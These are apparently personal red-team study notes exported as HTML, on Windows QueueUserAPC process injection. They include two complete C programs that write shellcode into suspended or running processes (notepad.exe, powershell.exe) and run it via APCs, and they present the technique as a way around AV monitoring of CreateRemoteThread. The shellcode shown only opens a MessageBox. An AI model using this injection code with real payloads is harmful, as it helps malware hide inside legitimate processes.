<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>QueueUserAPC Execution</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># QueueUserAPC Execution</h1></strong><br />APC stands for Asynchronous Procedure Calls.<br />An APC is a function call / code that is to be executed within the context of a thread.<br />Each thread has its own APC queue.<br />You can queue an APC to a thread using <code>QueueUserAPC</code>.<br /><br />There are both user-land and kernel-mode APCs.<br />In user-land, the thread only gets directed to call the queued APC function when the thread is in an alertable state.<br /><br />• <a href="https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls</a><br />• <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc</a><br /><br /><strong>Links</strong><br />• <a href="https://repnz.github.io/posts/apc/user-apc/#queueuserapc-kernelbase-dll-layer">https://repnz.github.io/posts/apc/user-apc/#queueuserapc-kernelbase-dll-layer</a> - Lots of very good info on APCs and how to force them to execute<br />   ◇ <a href="https://github.com/repnz/apc-research">https://github.com/repnz/apc-research</a><br /><br /><strong><h2>## QueueUserAPC as an Execution Technqiue</h2></strong><br />QueueUserAPC is often referred to as an injection technique.<br />It&#39;s not an injection technqiue because the injecting code is done by usual means (WriteProcessMemory etc.)<br />To be specific, QueueUserAPC is an execution technqiue - execution of injected code (the final stage in a process injection method).<br /><br />QueueUserAPC can be used to execute code at an address.<br />This means you can execute functions and shellcode in remote processes, it&#39;s not an injection technqiue in itself.<br />Try mixing it with other injection technqiues.<br /><br />Another example of an execution technqiue seen in other process injection examples is CreateRemoteThread.<br /><br /><strong><h3>### As an Alternative to CreateRemoteThread</h3></strong><br /><code>QueueUserAPC</code> can be used as an alternative to <code>CreateRemoteThread</code>, which is often watched by AV products, because you can achieve exactly the same as what you can with CreateRemoteThread - execute code in threads in remote processes.<br /><br />For example, <br />the classic DLL injection technique is to write the path of the DLL into the target process and use CreateRemoteThread to call LoadLibrary in the target process. Instead of using CreateRemoteThread to call LoadLibrary, you could use QueueUserAPC instead. The exact same effect would be achieved.<br /><br />The code here does exactly that:<br /><a href="https://github.com/fdiskyou/injectAllTheThings/blob/master/injectAllTheThings/t_QueueUserAPC.cpp">https://github.com/fdiskyou/injectAllTheThings/blob/master/injectAllTheThings/t_QueueUserAPC.cpp</a><br /><br /><strong><h3>### QueueUserAPC Examples</h3></strong><br />• <a href="https://rinseandrepeatanalysis.blogspot.com/2019/04/early-bird-injection-apc-abuse.html?m=1">https://rinseandrepeatanalysis.blogspot.com/2019/04/early-bird-injection-apc-abuse.html?m=1</a><br />• <a href="https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection">https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection</a><br />• <a href="https://github.com/fdiskyou/injectAllTheThings/blob/master/injectAllTheThings/t_QueueUserAPC.cpp">https://github.com/fdiskyou/injectAllTheThings/blob/master/injectAllTheThings/t_QueueUserAPC.cpp</a> - injects a DLL by writing DLL path into target and calling LoadLibrary in target with QueueUserAPC by giving it the address of LoadLibrary (also has thread enumeration in process)<br /><br /><strong><h2>## Create Suspended Process -&gt; Inject Shellcode -&gt; Execute with QueueUserAPC</h2></strong><br />Because threads only get directed to call the queued APC function when the thread is in an alertable state,<br />you can&#39;t guarantee your code will be executed.<br /><br />By creating a suspended process, you can guarantee execution of your injected shellcode when you resume the process.<br /><br />Example:<br />• <a href="https://rinseandrepeatanalysis.blogspot.com/2019/04/early-bird-injection-apc-abuse.html?m=1">https://rinseandrepeatanalysis.blogspot.com/2019/04/early-bird-injection-apc-abuse.html?m=1</a><br /><br /><strong><h3>### Code</h3></strong><br />Tested on Windows 10 x86 compiled as x86.<br />Shellcode and binary is x86 because I couldn&#39;t find reliable x64 shellcode to spawn a MessageBox.<br /><br />The code below:<br />• creates a suspended 32bit Notepad process<br />• allocates memory inside of it<br />• writes the shellcode into it<br />• queues an APC to the thread to execute our shellcode<br />• resumes the suspended process to execute the shellcode<br /><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />//&nbsp;x86&nbsp;MessageBox&nbsp;shellcode<br />//&nbsp;https://www.exploit-db.com/exploits/37758<br />char&nbsp;shellcode[]&nbsp;=&nbsp;&quot;\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b&quot;<br />&quot;\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09&quot;<br />&quot;\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d&quot;<br />&quot;\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03&quot;<br />&quot;\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81&quot;<br />&quot;\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04&quot;<br />&quot;\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03&quot;<br />&quot;\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3&quot;<br />&quot;\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68&quot;<br />&quot;\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68&quot;<br />&quot;\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9&quot;<br />&quot;\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65&quot;<br />&quot;\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01&quot;<br />&quot;\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68&quot;<br />&quot;\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68&quot;<br />&quot;\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68&quot;<br />&quot;\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57&quot;<br />&quot;\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c&quot;<br />&quot;\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78&quot;<br />&quot;\x69\x74\x54\x53\xff\xd6\x57\xff\xd0&quot;;<br /><br />void&nbsp;InjectShellcode()<br />{<br />	BOOL&nbsp;b_ret&nbsp;=&nbsp;TRUE;<br />	DWORD&nbsp;i_ret&nbsp;=&nbsp;0;<br />	<br />	LPVOID&nbsp;target_memory&nbsp;=&nbsp;NULL;<br />	char&nbsp;target_process[]&nbsp;=&nbsp;&quot;C:\\Windows\\System32\\notepad.exe&quot;;<br />	STARTUPINFOA&nbsp;si&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	PROCESS_INFORMATION&nbsp;pi&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br /><br />	b_ret&nbsp;=&nbsp;CreateProcessA(target_process,&nbsp;NULL,&nbsp;NULL,&nbsp;NULL,&nbsp;FALSE,&nbsp;CREATE_SUSPENDED,&nbsp;NULL,&nbsp;NULL,&nbsp;&amp;si,&nbsp;&amp;pi);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;create&nbsp;process:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return;<br />	}<br />	else<br />		printf(&quot;[+]&nbsp;spawned&nbsp;%s&nbsp;\n&quot;,&nbsp;target_process);<br /><br />	target_memory&nbsp;=&nbsp;VirtualAllocEx(pi.hProcess,&nbsp;NULL,&nbsp;sizeof(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br />	if&nbsp;(target_memory&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;allocate&nbsp;memory&nbsp;in&nbsp;target:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return;<br />	}<br />	else<br />		printf(&quot;[+]&nbsp;allocated&nbsp;memory&nbsp;in&nbsp;target&nbsp;at:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_memory);<br /><br />	b_ret&nbsp;=&nbsp;WriteProcessMemory(pi.hProcess,&nbsp;target_memory,&nbsp;shellcode,&nbsp;sizeof(shellcode),&nbsp;NULL);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;write&nbsp;shellcode&nbsp;into&nbsp;target:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return;<br />	}<br />	else<br />		printf(&quot;[+]&nbsp;wrote&nbsp;shellcode&nbsp;into&nbsp;target&nbsp;at:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_memory);<br /><br />	i_ret&nbsp;=&nbsp;QueueUserAPC((PAPCFUNC)target_memory,&nbsp;pi.hThread,&nbsp;0);<br />	if&nbsp;(i_ret&nbsp;==&nbsp;0)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;write&nbsp;QueueUserAPC:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return;<br />	}<br />	else<br />		printf(&quot;[+]&nbsp;added&nbsp;APC&nbsp;to&nbsp;target&nbsp;process&nbsp;in&nbsp;thread:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;pi.hThread);<br /><br />	ResumeThread(pi.hThread);<br /><br />	return;<br />}<br /><br />int&nbsp;main(void)<br /><span style="color:#000000;font-weight:400">{</span><br />	InjectShellcode();<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h3>### Demo</h3></strong><br />In the image below I&#39;ve run the code.<br />In Process Hacker you can see the spawned <code>notepad.exe</code> process - PID 9496.<br />At <code>0x304000</code>, we can see read/write/execute (RWX) memory and our injected shellcode.<br />And our MesssageBox has spawned!<br /><a href=""><img src="images/1659-1.png" alt="images/1659-1.png" /></a><br /><br /><strong><h2>## Target Existing Process -&gt; Inject Shellcode -&gt; Spam QueueUserAPC on All Threads</h2></strong><br />Because threads only get directed to call the queued APC function when the thread is in an alertable state,<br />you can&#39;t guarantee your code will be executed.<br /><br />A solution to this is to spam QueueUserAPC on all the threads in the process.<br />Hopefully one of them will execute your code at some point.<br /><br />Therefore, this means that good target processes for QueueUserAPC execution are ones with lots of threads.<br />The example here uses <code>explorer.exe</code> as a target:<br /><a href="https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection">https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection</a><br /><br />You can check threads in a process with Process Hacker on the <code>Threads</code> tab.<br /><a href=""><img src="images/1659-2.png" alt="images/1659-2.png" /></a><br /><br /><strong><h3>### Code</h3></strong><br />In the code below, I&#39;m targetting a 32bit <code>powershell.exe</code> process.<br />The code:<br />• takes a snapshot of the processes and threads running on the system<br />• loops through the processes to find my target process - <code>powershell.exe</code><br />• opens a handle to the target, allocates memory, and writes my shellcode into it<br />• loops through the threads to find threads owned by my target process - <code>powershell.exe</code><br />• opens a handle to the thread, and runs QueueUserAPC on that thread to execute my shellcode (if it fails, it moves on to the next thread)<br /><br />Tested on Windows 10 x64 2004.<br />Compiled as x86 and targetting and an x86 binary (powershell.exe) because I couldn&#39;t find reliable x64 MessageBox shellcode.<br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br />#include&nbsp;&lt;TlHelp32.h&gt;<br /><br />//&nbsp;x86&nbsp;MessageBox&nbsp;shellcode<br />//&nbsp;https://www.exploit-db.com/exploits/37758<br />char&nbsp;shellcode[]&nbsp;=&nbsp;&quot;\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b&quot;<br />&quot;\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09&quot;<br />&quot;\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d&quot;<br />&quot;\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03&quot;<br />&quot;\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81&quot;<br />&quot;\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04&quot;<br />&quot;\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03&quot;<br />&quot;\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3&quot;<br />&quot;\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68&quot;<br />&quot;\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68&quot;<br />&quot;\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9&quot;<br />&quot;\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65&quot;<br />&quot;\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01&quot;<br />&quot;\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68&quot;<br />&quot;\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68&quot;<br />&quot;\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68&quot;<br />&quot;\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57&quot;<br />&quot;\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c&quot;<br />&quot;\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78&quot;<br />&quot;\x69\x74\x54\x53\xff\xd6\x57\xff\xd0&quot;;<br /><br />void&nbsp;SpamThreads(void)<br />{	<br />	BOOL&nbsp;b_ret&nbsp;=&nbsp;TRUE;<br />	DWORD&nbsp;i_ret&nbsp;=&nbsp;0;<br />	<br />	HANDLE&nbsp;h_snapshot&nbsp;=&nbsp;NULL;<br />	PROCESSENTRY32&nbsp;process&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	THREADENTRY32&nbsp;thread&nbsp;=&nbsp;{&nbsp;0&nbsp;};<br />	process.dwSize&nbsp;=&nbsp;sizeof(PROCESSENTRY32);<br />	thread.dwSize&nbsp;=&nbsp;sizeof(THREADENTRY32);<br /><br />	wchar_t&nbsp;target_process[]&nbsp;=&nbsp;L&quot;powershell.exe&quot;;<br />	BOOL&nbsp;process_found&nbsp;=&nbsp;FALSE;<br /><br />	HANDLE&nbsp;h_target_process&nbsp;=&nbsp;NULL;<br />	LPVOID&nbsp;target_shellcode&nbsp;=&nbsp;NULL;<br />	HANDLE&nbsp;h_target_thread&nbsp;=&nbsp;NULL;<br />	<br />	//&nbsp;take&nbsp;snapshot&nbsp;of&nbsp;processes<br />	h_snapshot&nbsp;=&nbsp;CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS&nbsp;|&nbsp;TH32CS_SNAPTHREAD,&nbsp;0);<br />	Process32First(h_snapshot,&nbsp;&amp;process);<br /><br />	//&nbsp;loop&nbsp;until&nbsp;we&nbsp;find&nbsp;our&nbsp;target&nbsp;process<br />	do<br />	{<br />		if&nbsp;(wcscmp(process.szExeFile,&nbsp;target_process)&nbsp;==&nbsp;0)<br />		{<br />			process_found&nbsp;=&nbsp;TRUE;<br />			break;<br />		}<br />	}&nbsp;while&nbsp;(Process32Next(h_snapshot,&nbsp;&amp;process));<br />	<br />	//&nbsp;if&nbsp;process&nbsp;found,&nbsp;write&nbsp;shellcode&nbsp;into&nbsp;target&nbsp;process<br />	if&nbsp;(process_found&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;find&nbsp;target&nbsp;process:&nbsp;%ws&nbsp;\n&quot;,&nbsp;target_process);<br />		return;<br />	}<br />	else&nbsp;if&nbsp;(process_found&nbsp;==&nbsp;TRUE)<br />	{<br />		printf(&quot;[+]&nbsp;found&nbsp;target&nbsp;process:&nbsp;%ws&nbsp;\n&quot;,&nbsp;target_process);<br />		<br />		h_target_process&nbsp;=&nbsp;OpenProcess(PROCESS_ALL_ACCESS,&nbsp;FALSE,&nbsp;process.th32ProcessID);<br />		if&nbsp;(h_target_process&nbsp;==&nbsp;NULL)<br />		{<br />			printf(&quot;\t&nbsp;failed&nbsp;to&nbsp;open&nbsp;target&nbsp;process:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />			return;<br />		}<br />		else<br />			printf(&quot;\t&nbsp;opened&nbsp;target&nbsp;process&nbsp;\n&quot;);<br />		<br />		target_shellcode&nbsp;=&nbsp;VirtualAllocEx(h_target_process,&nbsp;NULL,&nbsp;sizeof(shellcode),&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br />		if&nbsp;(target_shellcode&nbsp;==&nbsp;NULL)<br />		{<br />			printf(&quot;\t&nbsp;failed&nbsp;to&nbsp;allocate&nbsp;memory&nbsp;in&nbsp;target:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />			return;<br />		}<br />		else<br />			printf(&quot;\t&nbsp;allocated&nbsp;memory&nbsp;in&nbsp;target&nbsp;at:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_shellcode);<br />		<br />		b_ret&nbsp;=&nbsp;WriteProcessMemory(h_target_process,&nbsp;target_shellcode,&nbsp;shellcode,&nbsp;sizeof(shellcode),&nbsp;NULL);<br />		if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />		{<br />			printf(&quot;\t&nbsp;failed&nbsp;to&nbsp;write&nbsp;shellcode&nbsp;into&nbsp;target:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />			return;<br />		}<br />		else<br />			printf(&quot;\t&nbsp;wrote&nbsp;shellcode&nbsp;into&nbsp;target&nbsp;at:&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_shellcode);<br />	}<br /><br />	//&nbsp;loop&nbsp;through&nbsp;threads,&nbsp;grab&nbsp;thread&nbsp;IDs&nbsp;belonging&nbsp;to&nbsp;target&nbsp;process,&nbsp;and&nbsp;queue&nbsp;an&nbsp;APC&nbsp;call&nbsp;on&nbsp;them<br />	printf(&quot;[+]&nbsp;looping&nbsp;through&nbsp;threads...&nbsp;\n&quot;);<br />	<br />	Thread32First(h_snapshot,&nbsp;&amp;thread);<br />	do<br />	{<br />		if&nbsp;(thread.th32OwnerProcessID&nbsp;==&nbsp;process.th32ProcessID)<br />		{<br />			printf(&quot;\t&nbsp;thread&nbsp;ID:&nbsp;0x%d&quot;,&nbsp;thread.th32ThreadID);<br />			<br />			h_target_thread&nbsp;=&nbsp;OpenThread(THREAD_SET_CONTEXT,&nbsp;FALSE,&nbsp;thread.th32ThreadID);<br />			if&nbsp;(h_target_thread&nbsp;==&nbsp;NULL)<br />			{<br />				printf(&quot;&nbsp;-&nbsp;open&nbsp;failed:&nbsp;%d&nbsp;-&nbsp;trying&nbsp;next&nbsp;thread&nbsp;\n&quot;,&nbsp;GetLastError());<br />				continue;<br />			}<br />			else<br />				printf(&quot;&nbsp;-&nbsp;open&nbsp;success!&quot;);<br />			<br />			i_ret&nbsp;=&nbsp;QueueUserAPC((PAPCFUNC)target_shellcode,&nbsp;h_target_thread,&nbsp;0);<br />			if&nbsp;(i_ret&nbsp;==&nbsp;0)<br />			{<br />				printf(&quot;&nbsp;-&nbsp;queue&nbsp;APC&nbsp;failed:&nbsp;%d&nbsp;trying&nbsp;next&nbsp;thread&nbsp;\n&quot;,&nbsp;GetLastError());<br />				CloseHandle(h_target_thread);<br />				continue;<br />			}<br />			else<br />				printf(&quot;&nbsp;-&nbsp;queue&nbsp;APC&nbsp;success!&nbsp;\n&quot;);<br /><br />			CloseHandle(h_target_thread);<br />		}<br />	}&nbsp;while&nbsp;(Thread32Next(h_snapshot,&nbsp;&amp;thread));<br /><br />	return;<br />}<br /><br />int&nbsp;main(void)<br /><span style="color:#000000;font-weight:400">{</span><br />	SpamThreads();<br />	<br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br />In the image below you can see that:<br />• it&#39;s found the target - <code>powershell.exe</code><br />• opened a handle to it, allocated memory in it, and written my shellcode into it<br />• found threads belonging to my target - <code>powershell.exe</code> - on the system<br />• and run QueueUserAPC on those threads to execute my shellcode<br />• 5 instances of shellcode have been run as a result (the 5 &quot;Hello World!&quot; MessageBoxes you see)<br /><br />In Process Hacker&#39;s <code>Threads</code> tab you can see the threads it has targetted.<br />And in the <code>Memory</code> tab you can see the injected shellcode.<br /><a href=""><img src="images/1659-3.png" alt="images/1659-3.png" /></a></div>
</body>
</html>
